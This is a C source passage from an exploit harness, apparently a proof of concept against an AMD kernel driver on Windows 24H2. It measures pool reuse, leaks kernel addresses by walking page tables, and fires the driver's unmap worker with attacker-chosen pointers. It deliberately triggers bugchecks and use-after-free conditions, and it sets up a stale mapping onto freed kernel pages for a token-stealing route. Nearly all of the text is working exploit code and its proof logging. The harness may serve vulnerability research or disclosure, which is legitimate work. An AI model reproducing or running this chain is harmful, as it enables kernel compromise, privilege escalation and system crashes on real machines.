            LogW(L"[x] paint failed -- aborting at trial %u", t);
            return 3;
        }
        ZeroMemory(&a1, sizeof a1); ZeroMemory(&a2, sizeof a2);
        ZeroMemory(&cap, sizeof cap); ZeroMemory(&nxt, sizeof nxt);
        bHead = bContent = bEmpty = bGeom = FALSE;
        if (DevCmdMap(0x1000, 0x1000, 1, &a1) &&
            DevCmdMap(0x1000, 0x1000, 1, &a2) &&
            DevCmdUnmap(a1.block, NULL) &&
            DevCmdUnmap(a2.block, NULL) &&
            DevCmdCapture(0x1000, 0x20, &cap)) {
            bHead = (cap.block != 0 && cap.block == a2.block && a1.block != a2.block);
            if (cap.userVa && cap.userVa < 0x800000000000ULL) {
                memcpy(buf, (const void *)(uintptr_t)cap.userVa, sizeof buf);
                bContent = (memcmp(buf, marker, sizeof buf) == 0);
            }
            /* single probe map: bucket-empty AND geometry from the same
             * allocation (v1.3 called DevCmdMap twice and leaked one chunk
             * per trial). geometry-linear: nxt == cap+0x80 would pin the
             * attacker-content buffer at cap+0x40 when the pool marches
             * forward; 0/50 in the field -> the buffer lands on AGED
             * chunks instead (deferred-free-list behavior, see --aged). */
            bEmpty = bGeom = FALSE;
            if (DevCmdMap(0x1000, 0x1000, 1, &nxt)) {
                bEmpty = nxt.block != a1.block && nxt.block != a2.block;
                bGeom = nxt.block == cap.block + 0x80;
                DevCmdUnmap(nxt.block, NULL);
            }
            tLive++;
            if (t == 0) {
                LogW(L"    trial 0 detail: a1=0x%016llx a2=0x%016llx",
                     (unsigned long long)a1.block, (unsigned long long)a2.block);
                LogW(L"                  capture block=0x%016llx (want a2) "
                     L"userVa=0x%016llx", (unsigned long long)cap.block,
                     (unsigned long long)cap.userVa);
                LogW(L"                  predicted buffer KVA=0x%016llx "
                     L"(cap+0x40); next map=0x%016llx (want cap+0x80)",
                     (unsigned long long)(cap.block + 0x40),
                     (unsigned long long)nxt.block);
                if (cap.userVa && cap.userVa < 0x800000000000ULL)
                    Dump(cap.userVa, 0x20);
            }
        } else {
            LogW(L"[x] transport failure -- aborting at trial %u", t);
            return 3;
        }
        headHit    += bHead;
        contentHit += bContent;
        emptyHit   += bEmpty;
        geomHit    += bGeom;
        PhysUnpaint(&pn, saved);
    }
    LogW(L"[P1] E1.3 result over %u trials: head-reclaim %u | marker at "
         L"capture userVa %u (attacker-content buffer) | bucket-empty %u | "
         L"geometry-linear %u (next map == cap+0x80 => buffer KVA == "
         L"cap+0x40)",
         tLive, headHit, contentHit, emptyHit, geomHit);
    if (geomHit == tLive && contentHit == tLive && tLive > 0) {
        LogW(L"[P1] [OK] CAPTURE GEOMETRY CONFIRMED: attacker-content buffer "
             L"at cap.block+0x40, next map at cap.block+0x80 -- the buffer's "
             L"KERNEL ADDRESS is now known without reading kernel memory. "
             L"Stage 2 can target the buffer directly: our qwords at "
             L"buffer+0x08/+0x10 are exactly what the unmap worker derefs "
             L"(MmUnmapLockedPages + IoFreeMdl) -- zero free-list-reuse "
             L"dependence (head-reclaim %u/%u is DEAD on 24H2 and no longer "
             L"needed by the choreography)", headHit, tLive);
        LogW(L"[P1] note: each trial leaked one capture block 0x20 + data "
             L"buffer + MDL + user mapping (capture-block release path is a "
             L"different command); %u trials = negligible for measurement",
             tLive);
    } else if (contentHit == tLive && tLive > 0)
        LogW(L"[P1] [ABORT] content control holds but geometry NOT linear "
             L"(%u/%u) -- capture buffer KVA cannot be inferred; stop and "
             L"send the log back", geomHit, tLive);
    else
        LogW(L"[P1] [ABORT] capture ladder not confirmed -- the choreography "
             L"cannot assume the capture worker's alloc order; gather more "
             L"trials or try on a fresher boot");
    return (geomHit == tLive && contentHit == tLive) ? 0 : 1;
}

/* [P1]/E1.4 -- aged-reuse ladder (benign). 24H2 pool evidence so far:
 * immediate free->realloc reuse 0/200 (E1.2), yet chunks freed in an earlier
 * RUN were served again 13 minutes later (v1.3 trial-0 a1 == v1.2's freed
 * a1). Model: frees go to a deferred list and re-enter service after aging.
 * Phase A measures the aging curve: free one chunk, wait D ms, re-map -- does
 * it take the same chunk?  D swept over {0, 1, 10, 100, 1000} ms x trials.
 * Phase B runs at the best delay: free A then B, wait, CAPTURE -- which aged
 * chunk does the capture block take (B = LIFO, A = FIFO, neither = fresh)?
 * plus one follow-up map to see whether the second aged chunk surfaces next.
 */
static int HarnessAged(UINT32 trials)
{
    static const DWORD delays[] = { 0, 1, 10, 100, 1000 };
    unsigned k;
    UINT32 t;
    int     bestIdx = -1;

    Section(L"[P1]/E1.4 aged-reuse ladder (benign; free->delay->realloc)");
    for (k = 0; k < sizeof(delays) / sizeof(delays[0]); k++) {
        UINT32 hit = 0, live = 0;
        for (t = 0; t < trials; t++) {
            DEVREQ a1, a2;
            ZeroMemory(&a1, sizeof a1); ZeroMemory(&a2, sizeof a2);
            if (DevCmdMap(0x1000, 0x1000, 1, &a1) &&
                DevCmdUnmap(a1.block, NULL)) {
                if (delays[k])
                    Sleep(delays[k]);
                if (DevCmdMap(0x1000, 0x1000, 1, &a2)) {
                    hit += (a2.block == a1.block);
                    live++;
                    DevCmdUnmap(a2.block, NULL);
                }
            }
        }
        LogW(L"[P1] E1.4 phase A: delay %lu ms -> same-chunk realloc %u/%u",
             (unsigned long)delays[k], hit, live);
        if (bestIdx < 0 && live > 0 && hit == live)
            bestIdx = (int)k;
    }
    /* Phase B: two-seed ordering at the first fully-deterministic delay
     * (fallback: the longest delay measured). */
    if (bestIdx < 0)
        bestIdx = (int)(sizeof(delays) / sizeof(delays[0])) - 1;
    LogW(L"[P1] E1.4 phase B: free A then B, wait %lu ms, capture -- which "
         L"aged chunk does the capture block take?",
         (unsigned long)delays[bestIdx]);
    {
        UINT32 lifo = 0, fifo = 0, fresh = 0, live = 0;
        for (t = 0; t < trials; t++) {
            DEVREQ A, B, cap, nxt;
            ZeroMemory(&A, sizeof A); ZeroMemory(&B, sizeof B);
            ZeroMemory(&cap, sizeof cap); ZeroMemory(&nxt, sizeof nxt);
            if (DevCmdMap(0x1000, 0x1000, 1, &A) &&
                DevCmdMap(0x1000, 0x1000, 1, &B) &&
                DevCmdUnmap(A.block, NULL) &&
                DevCmdUnmap(B.block, NULL)) {
                Sleep(delays[bestIdx]);
                if (DevCmdCapture(0x1000, 0x20, &cap)) {
                    live++;
                    if (cap.block == B.block && B.block != A.block) lifo++;
                    else if (cap.block == A.block)                 fifo++;
                    else                                          fresh++;
                    /* follow-up map: does the OTHER aged chunk surface? */
                    if (DevCmdMap(0x1000, 0x1000, 1, &nxt)) {
                        LogW(L"    [B] cap.block=0x%016llx (A=0x%016llx "
                             L"B=0x%016llx) nxt=0x%016llx %ls",
                             (unsigned long long)cap.block,
                             (unsigned long long)A.block,
                             (unsigned long long)B.block,
                             (unsigned long long)nxt.block,
                             nxt.block == A.block ? L"(nxt==A)"
                             : nxt.block == B.block ? L"(nxt==B)"
                             : nxt.block == cap.block + 0x40
                                                  ? L"(nxt==cap+0x40)"
                                                  : L"(fresh/other)");
                        DevCmdUnmap(nxt.block, NULL);
                    }
                    /* release the capture block+buffer+MDL is a different
                     * command; leaked here as in E1.3, negligible */
                }
            }
        }
        LogW(L"[P1] E1.4 phase B result over %u trials: capture block == B "
             "(LIFO) %u | == A (FIFO) %u | fresh %u",
             live, lifo, fifo, fresh);
        LogW(L"[P1] E1.4 verdict: %ls",
             lifo == live && live > 0
                 ? L"[OK] aged-LIFO confirmed -- the capture block "
                   L"deterministically consumes the most-recently-freed "
                   L"aged chunk; choreography restores with a delay"
             : fifo == live && live > 0
                 ? L"[OK] aged-FIFO confirmed -- capture block takes the "
                   L"OLDEST freed chunk; choreography adapts (free order "
                   L"reversed)"
                 : L"non-deterministic at this delay -- send the log back; "
                   L"sweep a longer delay or bulk-drain strategy next");
    }
    return 0;
}

/* [P1]/E1.5 -- kernel-address leak + translation gadget (BENIGN READS ONLY).
 * Replaces the dead free-list choreography: with CR3 (0xFFF02860 sel=3) and
 * arbitrary phys reads (0xFFF0281C), any KVA translates to a PA and reads
 * back. Per trial:
 *   1. capture (PA 0x1000, len 0x20) -> block C1 + user VA U1 from the reply;
 *      the attacker-content buffer D lives at *(C1+0x18) but its KVA is not
 *      in the reply.
 *   2. translate C1 -> PA_C1 (4 phys reads), read C1's 0x20 metadata block:
 *      verify [0x00] == 0x20 (len byte) and [0x08] == U1 -> translation
 *      VERIFIED against ground truth the driver itself wrote.
 *   3. extract D = block[0x18]; translate D -> PA_D; read D's 0x20 bytes;
 *      compare against a direct phys read of PA 0x1000 -> D-content check.
 * Acceptance: all trials green => the capture buffer's KVA is learnable and
 * the stage-2 target address (D) is known. --s2 v2 builds on this.
 */
static int HarnessLeak(UINT32 trials)
{
    UINT32 t, ok = 0;
    UINT64 cr3 = 0;
    UINT8  pa0[0x20];

    Section(L"[P1]/E1.5 kernel-address leak + translation gadget (benign reads only)");
    if (!DevCmdCrRead(3, &cr3))
        return 3;
    LogW(L"[+] CR3 (kernel DTB of this process) = 0x%016llx",
         (unsigned long long)cr3);
    if ((cr3 & 0xFFF) || !cr3 || cr3 >= 0x10000000000ULL) {
        LogW(L"[x] CR3 sanity failed (not 4K-aligned / out of range) -- "
             L"sel 3 may not be CR3 on this build; stop and send the log");
        return 3;
    }
    LogW(L"[i] CR3 sanity ok (4K-aligned, < 4TB phys)");
    {   /* v1.6 alignment/range sanity: which PA classes does the worker's
         * MmMapIoSpace accept? (v1.5: all unaligned walk reads failed GLE=8
         * = worker STATUS_NO_MEMORY on MmMapIoSpace null) */
        UINT8 tmp[8];
        BOOL bLo, bPg, bUn;

        bLo = DevCmdPhysRead(0x1000, tmp, 8);
        bPg = DevCmdPhysRead(cr3, tmp, 8);
        bUn = DevCmdPhysRead(cr3 + 0x9D8, tmp, 8);
        LogW(L"[i] phys-read sanity: PA 0x1000 (aligned low): %ls | CR3 page "
             L"0x%llx (aligned): %ls | CR3+0x9D8 (unaligned): %ls",
             bLo ? L"OK" : L"FAIL",
             (unsigned long long)cr3, bPg ? L"OK" : L"FAIL",
             bUn ? L"OK" : L"FAIL");
    }

    for (t = 0; t < trials; t++) {
        DEVREQ cap;
        UINT64 paC1 = 0, paD = 0, D = 0;
        UINT8  blk[0x20], dbuf[0x20];
        BOOL   bT = FALSE, bD = FALSE;

        ZeroMemory(&cap, sizeof(cap));
        ZeroMemory(blk, sizeof(blk));
        ZeroMemory(dbuf, sizeof(dbuf));
        if (!DevCmdCapture(0x1000, 0x20, &cap)) {
            LogW(L"[x] capture transport failure at trial %u", t);
            return 3;
        }
        LogW(L"    [E1.5] trial %u: C1(block)=0x%016llx U1(userVa)=0x%016llx",
             t, (unsigned long long)cap.block,
             (unsigned long long)cap.userVa);
        /* 2. translate C1 and read its metadata back */
        if (KvaToPa(cr3, cap.block, &paC1) &&
            ReadPhysBytes(paC1, blk, 0x20)) {
            bT = (blk[0] == 0x20) &&
                 (*(UINT64 *)(blk + 8) == cap.userVa);
            LogW(L"           C1 -> PA 0x%012llx; meta: len=0x%02x userVa="
                 L"0x%016llx (want 0x20 / 0x%016llx) %ls",
                 (unsigned long long)paC1, blk[0],
                 (unsigned long long)*(UINT64 *)(blk + 8),
                 (unsigned long long)cap.userVa,
                 bT ? L"[OK]" : L"[MISMATCH]");
        }
        /* 3. D = *(C1+0x18): the capture buffer's KVA */
        D = *(UINT64 *)(blk + 0x18);
        if (bT && D) {
            LogW(L"           D (buffer KVA) = 0x%016llx", (unsigned long long)D);
            if (KvaToPa(cr3, D, &paD)) {
                if (ReadPhysBytes(paD, dbuf, 0x20) &&
                    ReadPhysBytes(0x1000, pa0, 0x20)) {
                    bD = (memcmp(dbuf, pa0, 0x20) == 0);
                    LogW(L"           D -> PA 0x%012llx; content %ls PA "
                         L"0x1000 window (0x20 bytes)",
                         (unsigned long long)paD,
                         bD ? L"MATCHES" : L"DIFFERS FROM");
                    if (!bD) {
                        Dump((ULONG_PTR)dbuf, 0x20);
                        Dump((ULONG_PTR)pa0, 0x20);
                    }
                }
            }
        }
        ok += (bT && bD);
    }
    LogW(L"[P1] E1.5 result over %u trials: full-gadget-verified %u",
         trials, ok);
    if (ok == trials && trials > 0)
        LogW(L"[P1] [OK] LEAK + TRANSLATION GADGET CONFIRMED: the capture "
             L"buffer's kernel address D = *(C1+0x18) is learnable via "
             L"CR3 + page walk. Stage-2 (--s2 v2) can target D directly");
    else
        LogW(L"[P1] [ABORT] translation gadget not confirmed -- stop and "
             L"send the log back");
    return (ok == trials && trials > 0) ? 0 : 1;
}

/* [P1]/E2.0 -- contiguous-buffer primitive probe (BENIGN: alloc, write
 * through the user mapping, read back, free -- nothing derefs attacker
 * values). Validates the 0xFFF028AC family as the stage-2 target: a live
 * kernel buffer at a KNOWN KVA (reply +0x28) whose +0x08/+0x10 are exactly
 * the fields the unmap worker derefs, writable from user mode through the
 * worker's own user mapping (reply +0x18). */
static int HarnessContig(UINT32 trials)
{
    UINT32 t, ok = 0;

    Section(L"[P1]/E2.0 contiguous-buffer primitive (benign: alloc/write/free)");
    for (t = 0; t < trials; t++) {
        CONTIGREQ cr;
        UINT64 w8, w10, r8, r10;
        BOOL   good = TRUE;

        ZeroMemory(&cr, sizeof(cr));
        if (!DevCmdContigAlloc(0x100000ULL, 0x1000000000ULL, 1, 1, &cr)) {
            LogW(L"[x] alloc failed at trial %u", t);
            return 3;
        }
        if (!cr.kva || !cr.userVa || !cr.mdl || !cr.physPa ||
            cr.userVa >= 0x800000000000ULL || (cr.kva & 0xFFF)) {
            LogW(L"[x] alloc reply incomplete at trial %u: KVA=0x%016llx "
                 L"userVa=0x%016llx MDL=0x%016llx PA=0x%llx",
                 t, (unsigned long long)cr.kva,
                 (unsigned long long)cr.userVa, (unsigned long long)cr.mdl,
                 (unsigned long long)cr.physPa);
            good = FALSE;
        }
        w8  = 0x4144694F00000000ULL + t;
        w10 = 0x4144694F00000010ULL + t;
        if (good) {
            *(UINT64 *)((UINT8 *)(uintptr_t)cr.userVa + 0x08) = w8;
            *(UINT64 *)((UINT8 *)(uintptr_t)cr.userVa + 0x10) = w10;
            r8  = *(UINT64 *)((UINT8 *)(uintptr_t)cr.userVa + 0x08);
            r10 = *(UINT64 *)((UINT8 *)(uintptr_t)cr.userVa + 0x10);
            good = (r8 == w8 && r10 == w10);
            if (!good)
                LogW(L"[x] user-mapping write/readback failed at trial %u",
                     t);
        }
        if (good && !DevCmdContigFree(&cr)) {
            LogW(L"[x] free failed at trial %u (leaked KVA 0x%016llx)", t,
                 (unsigned long long)cr.kva);
            return 3;
        }
        if (t == 0)
            LogW(L"    trial 0: KVA=0x%016llx userVa=0x%016llx MDL=0x%016llx "
                 L"PA=0x%llx -- user-mapping write/readback %ls, free %ls",
                 (unsigned long long)cr.kva,
                 (unsigned long long)cr.userVa, (unsigned long long)cr.mdl,
                 (unsigned long long)cr.physPa,
                 good ? L"OK" : L"FAIL", good ? L"OK" : L"n/a");
        ok += good;
    }
    LogW(L"[P1] E2.0 result over %u trials: contig alloc+write+free ok %u",
         trials, ok);
    if (ok == trials && trials > 0)
        LogW(L"[P1] [OK] CONTIG PRIMITIVE CONFIRMED: live kernel buffer at "
             L"known KVA, +0x08/+0x10 user-writable, clean free -- --s2 "
             L"(snapshot-gated) can now fire the unmap worker at the KVA");
    else
        LogW(L"[P1] [ABORT] contig primitive not confirmed -- stop and send "
             L"the log back");
    return (ok == trials && trials > 0) ? 0 : 1;
}

/* [P2] -- the controlled-primitive trigger. DESTRUCTIVE BY DESIGN: unless
 * q8/q16 happen to be valid, the machine bugchecks inside the stage-2 call.
 * Choreography: paint marker (q8@+0x08, q16@+0x10 bytes) at PA; seed two
 * freed chunks a1, a2 (KNOWN addresses from their map replies); the capture
 * call's 0x20 block takes a2 (LIFO head) and its ATTACKER-CONTENT buffer
 * takes a1 -- so the buffer content IS our marker bytes. Then fire the
 * unmap worker at a1: it derefs *(a1+0x08) = q8 and *(a1+0x10) = q16:
 *
 *     MmUnmapLockedPages(q8, q16);        <- first fully-chosen parameters
 *     IoFreeMdl(q16);
 *     ExFreePoolWithTag(a1, 0);          <- frees the LIVE capture buffer
 *
 * while we still hold the capture worker's user mapping of the very same
 * buffer -> after a benign q8/q16 the UAF is attacker-writable stale state.
 * A bugcheck here is itself proof: the dump shows OUR values as the fault
 * parameters. */
/* [P2b] -- self-MDL deref proof: the NON-crashing, user-verifiable stage-2.
 * P2a (null probe) proved the free leg (ExFreePool of the chosen contig KVA,
 * delayed corruption, attributable aftermath) but the deref leg could not
 * be distinguished from the driver's own zeroed buffer. Here the qwords are
 * DISTINCTIVE with a CHECKABLE effect:
 *   q8  = the contig buffer's OWN user VA (known from the 0xFFF028AC reply)
 *   q16 = its OWN MDL               (known from the reply)
 * The unmap worker then executes, with OUR values:
 *   MmUnmapLockedPages(OUR userVa, OUR MDL)  <- tears down OUR mapping
 *   IoFreeMdl(OUR MDL)
 *   ExFreePool(KVA)                          <- still corrupts the pool
 * After the call the harness checks the mapping state with VirtualQuery:
 * if OUR user VA is dead, the driver demonstrably consumed OUR qwords.
 * No crash is needed for the proof itself; the trailing ExFreePool still
 * corrupts the pool, so a DELAYED crash is expected AFTER the verdict --
 * every critical line goes to amd_esc_poc.proof via WriteFile +
 * FlushFileBuffers, which survives the bugcheck. */
/* [P2b] -- self-MDL deref proof, v1.9 differential design. Run 1 taught:
 * the A8 call returns, but the trailing ExFreePool corruption can kill the
 * VERY NEXT kernel operation -- the verdict WriteFile died mid-flight. So:
 *   (a) verify FIRST (two light VirtualQuery syscalls), write the verdict
 *       ONCE afterwards;
 *   (b) DIFFERENTIAL: fire with q8/q16 = buffer #2's userVa/MDL while the
 *       "block" is buffer #1. The derefs tear down uv2 (q8/q16) and must
 *       leave uv1 (untouched by the worker) LIVE: uv2 DEAD && uv1 LIVE can
 *       only happen if the worker consumed OUR staged values. The mapping
 *       death is observable from user mode -- no in-call crash needed.
 * The trailing ExFreePool(KVA1) still corrupts the pool; a delayed crash
 * after the verdict is expected and harmless to the evidence (ProofLog is
 * OS-committed per line). */
/* ---- watcher-proof variant: same OS-committed line discipline, separate
 * file amd_esc_poc.s2watch.proof, so the --s2watch child owns the
 * differential verdict line. Both runs (P2b run-1 and run-2) showed the
 * corrupted process dies in its NEXT WriteFile (nt+0xaa18fd + WdFilter
 * frame) -- the child, which polls without writing and stays uncorrupted
 * until the moment it catches the transition, owns the record. ---- */
static HANDLE g_watch;

static void WatchOpen(void)
{
    wchar_t path[640], *slash;

    if (g_watch)
        return;
    if (!GetModuleFileNameW(NULL, path, 600))
        return;
    slash = wcsrchr(path, L'\\');
    if (!slash)
        return;
    wcscpy(slash + 1, L"amd_esc_poc.s2watch.proof");
    g_watch = CreateFileW(path, GENERIC_WRITE, FILE_SHARE_READ, NULL,
                          OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (g_watch == INVALID_HANDLE_VALUE)
        g_watch = NULL;
    else
        SetFilePointer(g_watch, 0, NULL, FILE_END);
}

static void ProofWatchLog(const wchar_t *fmt, ...)
{
    wchar_t wbuf[1024];
    char    abuf[2100];
    DWORD   wr2 = 0;
    int     n;
    va_list ap;
    SYSTEMTIME tm;

    va_start(ap, fmt);
    vswprintf(wbuf, 1022, fmt, ap);
    va_end(ap);
    wcscat(wbuf, L"\r\n");
    GetLocalTime(&tm);
    WatchOpen();
    if (!g_watch)
        return;
    {
        char pre[40];
        int  m = sprintf(pre, "[%02u:%02u:%02u.%03u] ",
                         tm.wHour, tm.wMinute, tm.wSecond, tm.wMilliseconds);
        WriteFile(g_watch, pre, m, &wr2, NULL);
    }
    n = WideCharToMultiByte(CP_UTF8, 0, wbuf, -1, abuf, sizeof(abuf), NULL, NULL);
    if (n > 1) {
        WriteFile(g_watch, abuf, n - 1, &wr2, NULL);
        FlushFileBuffers(g_watch);
    }
}

static int HarnessS2Watch(ULONG pid, UINT64 uva1, UINT64 uva2)
{
    HANDLE hProc;
    MEMORY_BASIC_INFORMATION m;
    BOOL v1 = TRUE, v2 = TRUE;      /* last observed committed states (t0) */
    BOOL settled = FALSE;           /* a stable differential state was logged */
    ULONGLONG tStart = GetTickCount64(), deadline;
    ULONGLONG ms;

    WatchOpen();
    ProofWatchLog(L"==== --s2watch (differential capture child) ====");
    ProofWatchLog(L"[+] parent pid=%lu  uv1=0x%016llx (untouched)  "
                  L"uv2=0x%016llx (deref target)",
                  pid,
                  (unsigned long long)uva1, (unsigned long long)uva2);

    /* PROCESS_SYNCHRONIZE is required for WaitForSingleObject on the handle:
     * v2.0 shipped without it, WaitForSingleObject returned WAIT_FAILED, the
     * child misread the LIVE parent as exited and bailed at +0 ms (run-3's
     * s2watch.proof logged "parent exited" while the parent's fire line was
     * 400 ms later). (defined by winnt.h; older mingw headers omit it) */
#ifndef PROCESS_SYNCHRONIZE
#define PROCESS_SYNCHRONIZE 0x00100000L
#endif
    hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ |
                        PROCESS_SYNCHRONIZE, FALSE, pid);
    if (!hProc) {
        ProofWatchLog(L"[x] OpenProcess failed GLE=%lu -- no capture",
                      GetLastError());
        return 3;
    }
    ProofWatchLog(L"[i] polling VirtualQueryEx on both VAs, busy loop, 10 s; "
                  L"parent %ls at start",
                  WaitForSingleObject(hProc, 0) == WAIT_TIMEOUT
                      ? L"ALIVE" : L"NOT ALIVE");

    deadline = tStart + 10000;
    while (GetTickCount64() < deadline) {
        BOOL a1 = VirtualQueryEx(hProc, (LPCVOID)(uintptr_t)uva1, &m,
                                 sizeof(m)) && m.State == MEM_COMMIT;
        BOOL a2 = VirtualQueryEx(hProc, (LPCVOID)(uintptr_t)uva2, &m,
                                 sizeof(m)) && m.State == MEM_COMMIT;
        BOOL parentAlive = WaitForSingleObject(hProc, 0) == WAIT_TIMEOUT;

        ms = GetTickCount64() - tStart;
        if (a1 != v1 || a2 != v2) {
            ProofWatchLog(L"[+] TRANSITION at +%uums: uv1 %ls uv2 %ls",
                          (unsigned)ms, a1 ? L"LIVE" : L"dead",
                          a2 ? L"LIVE" : L"dead");
            v1 = a1; v2 = a2;
        }

        /* the differential: uv2 (the value the worker read at B+0x08 and
         * unmapped, MDL at B+0x10 freed) dies while uv1 -- which the worker
         * never touches -- stays live. Valid ONLY while the parent lives:
         * uv mappings vanish with the process, so a post-exit observation
         * would be teardown, not the worker. */
        if (a1 && !a2 && parentAlive && !settled) {
            settled = TRUE;
            ProofWatchLog(L"[+] *** DEREF CONTROL PROVEN (differential): "
                          L"uv2 DEAD at +%uums with the parent ALIVE, while "
                          L"uv1 (same family, same fire, never referenced by "
                          L"the worker) is LIVE -- the worker executed "
                          L"MmUnmapLockedPages(uv2, MDL2) and IoFreeMdl(MDL2) "
                          L"with OUR staged qwords. ***",
                          (unsigned)ms);
            break;                  /* verdict flushed; no further syscalls */
        }
        if (!a1 && !a2 && parentAlive && !settled) {
            settled = TRUE;
            ProofWatchLog(L"[x] both VAs DEAD with parent alive at +%uums -- "
                          L"no differential (uv1 should have survived)",
                          (unsigned)ms);
            break;
        }
        if (!parentAlive && !a1) {
            ProofWatchLog(L"[i] parent exited at +%uums with uv1 dead -- "
                          L"state is post-mortem teardown, not the worker",
                          (unsigned)ms);
            break;
        }
        if (!parentAlive && !settled && a1 && a2) {
            ProofWatchLog(L"[i] parent exited at +%uums with uv1 LIVE uv2 "
                          L"LIVE -- it exited before any teardown was "
                          L"observed (fire failed or worker left both)",
                          (unsigned)ms);
            break;
        }
        Sleep(0);                   /* busy poll; parent is blocked in-call */
    }
    if (GetTickCount64() >= deadline)
        ProofWatchLog(L"[x] timeout: uv1 %ls uv2 %ls -- no transition in "
                      L"the 10 s window",
                      v1 ? L"LIVE" : L"dead", v2 ? L"LIVE" : L"dead");
    ProofWatchLog(L"==== --s2watch end ====");
    CloseHandle(hProc);
    return settled ? 0 : 1;
}

/* v2.3 --s2block: the clean in-call capture. Five runs proved (a) any
 * WriteFile after the poison faults at nt+0xaa18fd in WdFilter's hook, and
 * (b) the fake-MDL craft at B+0x10 didn't fault in-call either -- the runs
 * kept dying on the poison instead of yielding a verdict. This mode drops
 * both: fire the unmap worker at B = an attacker-chosen UNMAPPED canonical
 * kernel VA. The worker's very first deref (v4 = *(B+0x10), 0x140002cce)
 * faults IN-CALL -- bugcheck 0x50 with P1 = B+0x10 -- the bugcheck reporter
 * records our magic, no post-fire write, no pool poison, no fake-MDL
 * guesswork. The B argument itself is the A8 hole: attacker-supplied block
 * pointer, validated nowhere. */
static int HarnessS2Block(void)
{
    UINT32 st = 0;
    UINT64 blk = 0xffff8a0102030400ULL;   /* chosen unmapped canonical kernel VA */

    Section(L"[P2d] arbitrary-B deref capture -- in-call (v2.3)");
    LogW(L"[!] B = 0xffff8a0102030400: a chosen unmapped canonical kernel VA. "
         L"The worker's first deref v4 = *(B+0x10) (0x140002cce) faults "
         L"IN-CALL -> bugcheck 0x50 with P1 = 0xffff8a0102030410 -- the dump "
         L"args carry our chosen value; no post-fire write, no pool poison");
    ProofLog(L"==== --s2block (in-call, v2.3) ====");
    ProofLog(L"[i] firing unmap worker with B = 0x%016llx; the worker's first "
             L"deref = *(B+0x10) -> expected in-call bugcheck 0x50 with "
             L"P1 = 0xffff8a0102030410 (no write after this line)",
             blk);
    if (!DevCmdUnmap(blk, &st)) {
        ProofLog(L"[x] DeviceIoControl failed GLE=%lu (pre-call failure)",
                 GetLastError());
        return 3;
    }
    /* unexpected: the deref survived -- state below is best-effort; the
     * machine has no poison from this fire */
    ProofLog(L"[!] call RETURNED (deref of the chosen block did not fault) -- "
             L"dump args would be missing; report this proof line");
    Sleep(5000);
    return 2;
}

/* v2.4 --s2window: P3a, the stale window, now ONE benign call instead of the
 * whole stage-1/reclaim choreography. sub_140001ADC (0xFFF028B0) takes every
 * operand from the request buffer: MDL at +0x20 drives MmUnmapLockedPages
 * (*+0x18 VA) + MmUnlockPages + IoFreeMdl, then MmFreeContiguousMemory-
 * SpecifyCache(*(input+0x28) KVA, *(input+0x30)<<12 bytes, *(input+0x36)
 * cache). Hand it a REAL (userVa, MDL) pair from sacrificial buffer #2 for
 * the unmap legs -- a combination already proven benign in-call (runs 1-6:
 * real MDL + real userVa = legit teardown, worker returned) -- but C1's
 * KVA/pages/cache in the free leg: the worker releases C1's contiguous pages
 * into MM free-page lists while C1's user PTE stays valid. That is the
 * plan's persistent stale user mode window onto freed pool-eligible pages at
 * a KNOWN kernel PA. Read-only through the window, so no blind corruption
 * risk; the page paint doubles as the plan's open 24H2 zeroing probe (magic
 * intact vs zeroed vs overwritten), and the spray loop logs live POOL tags as
 * chunks land in the page. If a chunk changes the window we have the
 * victim-grooming window for the token route -- logged, not crashed on. */
static int HarnessS2Window(UINT32 sprayN)
{
    CONTIGREQ c1, c2;
    DEVREQ    dr;
    UINT32    st = 0;
    volatile UINT8 *w1;
    UINT64    before0, before8, tag32;
    UINT64    last8;
    int       changes = 0, i, rc = 0;

    Section(L"[P3a] stale-window establishment + pool telemetry (v2.5)");
    ProofLog(L"==== --s2window (stale window, P3a) ====");

    ZeroMemory(&c1, sizeof(c1)); ZeroMemory(&c2, sizeof(c2));
    if (!DevCmdContigAlloc(0x100000ULL, 0x1000000000ULL, 1, 1, &c1)) {
        ProofLog(L"[x] contig alloc #1 failed -- nothing fired");
        return 3;
    }
    if (!DevCmdContigAlloc(0x100000ULL, 0x1000000000ULL, 1, 1, &c2)) {
        ProofLog(L"[x] contig alloc #2 failed -- nothing fired (buffer1 leaked)");
        return 3;
    }
    ProofLog(L"[+] window   : KVA=0x%016llx userVa=0x%016llx PA=0x%llx MDL=0x%016llx",
             (unsigned long long)c1.kva, (unsigned long long)c1.userVa,
             (unsigned long long)c1.physPa, (unsigned long long)c1.mdl);
    ProofLog(L"[+] donor    : KVA=0x%016llx userVa=0x%016llx MDL=0x%016llx",
             (unsigned long long)c2.kva, (unsigned long long)c2.userVa,
             (unsigned long long)c2.mdl);
    w1 = (volatile UINT8 *)(uintptr_t)c1.userVa;
    before0 = 0x314C4F4F5444414DULL;                  /* "AMDTOOL1" */
    before8 = 0x324C4F4F5444414DULL;                  /* "AMDTOOL2" at +0x800 */
    *(volatile UINT64 *)(w1 + 0x100) = before0;
    *(volatile UINT64 *)(w1 + 0x800) = before8;
    ProofLog(L"[+] page painted (zeroing probe baseline): "
             L"*(+0x100)=0x314C4F4F5444414D *(+0x800)=0x324C4F4F5444414D");
    if (*(volatile UINT64 *)(w1 + 0x100) != before0 ||
        *(volatile UINT64 *)(w1 + 0x800) != before8) {
        ProofLog(L"[x] paint readback failed -- aborting before the fire");
        return 3;
    }
    last8 = *(volatile UINT64 *)(w1 + 0x08);          /* POOL tag word location */

    ProofLog(L"[i] firing contigfree with donor (userVa,MDL)=%016llx,%016llx "
             L"but KVA/pages/cache of the WINDOW buffer -- donor mapping dies "
             L"(proven-legit legs), window buffer's pages are released to MM "
             L"free lists while its user PTE stays valid (no write after "
             L"this line until the window verdict)",
             (unsigned long long)c2.userVa, (unsigned long long)c2.mdl);
    c1.userVa = c2.userVa;      /* unmap legs: REAL donor pair  */
    c1.mdl    = c2.mdl;         /* (free leg keeps KVA/pages/cache = c1) */
    if (!DevCmdContigFree(&c1)) {
        ProofLog(L"[x] contigfree transport failure GLE=%lu -- window state "
                 L"unknown", GetLastError());
        return 3;
    }
    if ((st = c1.status) != 0) {
        ProofLog(L"[x] contigfree rejected: status %u", st);
        return 3;
    }
    ProofLog(L"[+] contigfree RETURNED status 0 -- donor mapping released, "
             L"window buffer's PA released to MM while the user mapping "
             L"should stay live (reading it now reads freed pages)");

    /* window verdict: is the stale mapping alive, and what does the page
     * hold now? Read-only access; classification: magic / zeros / other */
    {
        UINT64 v100 = *(volatile UINT64 *)(w1 + 0x100);
